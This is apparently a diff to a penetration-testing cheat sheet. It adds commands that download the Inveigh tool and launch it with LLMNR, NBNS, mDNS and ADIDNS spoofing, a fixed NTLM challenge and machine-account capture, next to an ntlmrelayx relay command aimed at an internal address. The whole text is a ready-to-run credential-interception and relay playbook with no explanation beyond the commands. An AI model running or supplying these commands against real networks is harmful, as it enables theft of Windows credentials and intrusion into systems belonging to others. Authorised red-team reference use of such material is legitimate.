@@ -652,9 +652,13 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c
 ```
 ## Inveigh
 ```powershell
+wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
+Start-Job {Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y}
+Start-Job {Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y}
+
+
 wget https://github.com/Kevin-Robertson/Inveigh/releases/download/v2.0.10/Inveigh-net4.6.2-v2.0.10.zip
 unzip Inveigh-net4.6.2-v2.0.10.zip
-
 Start-Job {.\Inveigh.exe -Console 5 -NBNS y -FileOutput y -LogOutput y}
 Receive-Job -Id
 ```
